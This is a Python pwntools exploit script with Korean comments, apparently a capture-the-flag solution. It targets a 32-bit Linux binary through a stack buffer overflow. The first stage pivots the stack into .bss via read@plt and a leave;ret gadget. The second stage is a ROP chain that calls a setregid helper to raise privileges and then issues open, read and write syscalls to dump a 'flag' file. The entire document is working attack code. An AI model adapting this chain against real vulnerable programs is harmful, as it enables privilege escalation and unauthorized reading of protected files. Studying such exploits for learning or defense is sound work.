# do_setregid에서 segmentation fault 터짐... saved ebx 때문인 것 같음. syscall로 갈아타기로 함.
from pwn import *

context.arch = "i386"
context.os = "linux"

# ================================================
# ROP 체인 흐름
# stage1. pivot : stage(.bss)를 스택처럼 사용
# stage2. 공격
#   1) do_setregid : flag를 읽기 위한 권한 세팅 
#   2) syscall ORW : flag 열기, 읽기, 출력
# =================================================

# 필요한 값 세팅
OFFSET     = 0x48
STAGE      = 0x0804c040
READ_PLT   = 0x08049040
LEAVE_RET  = 0x0804923d
DO_SETREGID= 0x080491ce
POP_EAX    = 0x080491c3
POP_EBX    = 0x080491c5
POP_ECX    = 0x080491c7
POP_EDX    = 0x080491c9
SYSCALL    = 0x080491b0


# =================================================
# stage1. pivot
# =================================================
stage1  = b"A" * OFFSET        # offset
stage1 += p32(STAGE)           # saved EBP = stage addr
stage1 += p32(READ_PLT)        # saved RET = read@plt
stage1 += p32(LEAVE_RET)       # next RET = leave_ret
stage1 += p32(0)               # arg1(fd) = 0 (stdin)
stage1 += p32(STAGE)           # arg2 = stage
stage1 += p32(0x800)           # arg3(size) = 0x800
stage1 = stage1.ljust(400, b"B")


# =================================================
# stage2. exploit
# =================================================
FLAG = STAGE + 0x80           # flag 문자열 위치 = stage + 0x80
BUF  = STAGE + 0x100          # buf로 쓸 곳 위치 = stage + 0x100

stage2 = p32(0xdeadbeef)      # fake_ebp

# --------------- (1) do_setregid ---------------
stage2 += p32(DO_SETREGID)

# ---------------- (2) ORW ----------------------

# open("flag", 0, 0)
stage2 += p32(POP_EAX) + p32(5)
stage2 += p32(POP_EBX) + p32(FLAG)
stage2 += p32(POP_ECX) + p32(0)
stage2 += p32(POP_EDX) + p32(0)
stage2 += p32(SYSCALL)

# read(fd, BUF, 0x40)
stage2 += p32(POP_EAX) + p32(3)
stage2 += p32(POP_EBX) + p32(3)
stage2 += p32(POP_ECX) + p32(BUF)
stage2 += p32(POP_EDX) + p32(0x40)
stage2 += p32(SYSCALL)

# write(1, BUF, 0x40)
stage2 += p32(POP_EAX) + p32(4)
stage2 += p32(POP_EBX) + p32(1)
stage2 += p32(POP_ECX) + p32(BUF)
stage2 += p32(POP_EDX) + p32(0x40)
stage2 += p32(SYSCALL)

stage2 = stage2.ljust(0x80, b"\x00") # flag 문자열 위치 맞추기 (stage + 0x80)
stage2 += b"flag\x00"


# =================================================
# 출력
# =================================================
import sys
sys.stdout.buffer.write(stage1)
sys.stdout.buffer.write(stage2)
